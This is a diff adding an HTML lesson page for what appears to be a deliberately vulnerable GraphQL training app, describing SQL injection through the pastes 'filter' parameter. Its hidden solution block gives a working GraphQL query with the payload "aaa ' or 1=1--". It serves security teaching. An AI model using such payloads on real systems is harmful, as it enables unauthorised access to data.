@@ -1,0 +1,28 @@
+<!-- Start -->
+<h3 style="color:purple" id="inj-sql"><b>Injection :: SQL Injection</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  Pastes can be filtered using the <code>filter</code> parameter and it allows sending raw strings as query filters which are prone to SQL injections.
+</p>
+<h5>Resources</h5>
+<ul>
+  <li>
+    <a href="https://portswigger.net/support/using-burp-to-detect-sql-injection-flaws" target="_blank">
+      <i class="fa fa-newspaper"></i> PortSwigger - SQL Injection
+    </a>
+  </li>
+</ul>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-sql')">Show</button></h5>
+<div id="sol-inj-sql" style="display:none">
+<pre class="bash">
+# The filter parameter of the pastes operation allows escaping the SQL command and inject a SQL payload
+query {
+  pastes(filter:"aaa ' or 1=1--") {
+      content
+      title
+  }
+}
+</pre>
+</div>
+<!-- End -->
